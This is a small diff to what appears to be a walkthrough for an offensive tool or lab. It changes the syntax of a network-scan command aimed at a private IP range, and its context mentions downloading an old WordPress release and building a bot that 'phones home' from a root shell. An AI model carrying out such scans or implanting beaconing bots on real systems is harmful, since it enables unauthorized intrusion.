@@ -72,7 +72,7 @@ uname -a
 cd /var/www/html
 :file_download wordpress-4.4.tar.gz /tmp/wordpress-4.4.tar.gz
 cd /var/www/html/wordpress/wp-content/plugins
-:net_scan 172.31.44.1-172.31.44.10 255.255.255.0 1-666
+:net_scan 172.31.44.1-172.31.44.10 1-666
 ```
 
 SSH back into the WP instance and as root, make a bot that phones home:
